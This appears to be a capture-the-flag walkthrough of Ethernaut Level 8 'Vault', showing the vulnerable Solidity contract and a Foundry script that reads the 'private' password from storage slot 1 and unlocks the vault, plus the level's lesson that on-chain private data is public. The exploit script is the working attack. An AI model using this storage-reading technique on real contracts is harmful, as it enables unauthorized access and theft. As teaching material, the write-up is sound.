# Level 8 - Vault ⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/8" %}

### Level Setup

{% hint style="info" %}
Unlock the vault to pass the level!
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/Vault.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```
{% endcode %}

### Exploit

Private variable aren't secret, they are just not accessible by other smart contracts directly during smart contract execution. They can be read directly from the storage slots.

1. Use foundrys `vm.load` cheatcode to get the data in the slot.

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-8

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-8

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level8.s.sol" %}

{% code title="script/Level8.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

interface IVault {
    function unlock(bytes32 _password) external;
}

// ================================================================
// │                          LEVEL 8 - VAULT                     │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IVault targetContract = IVault(targetContractAddress);

        bytes32 password = vm.load(targetContractAddress, bytes32(uint256(1)));
        console.log("Password: %s", bytesToString(password));

        vm.startBroadcast();
        targetContract.unlock(password);
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.
{% endhint %}

### Notes

*
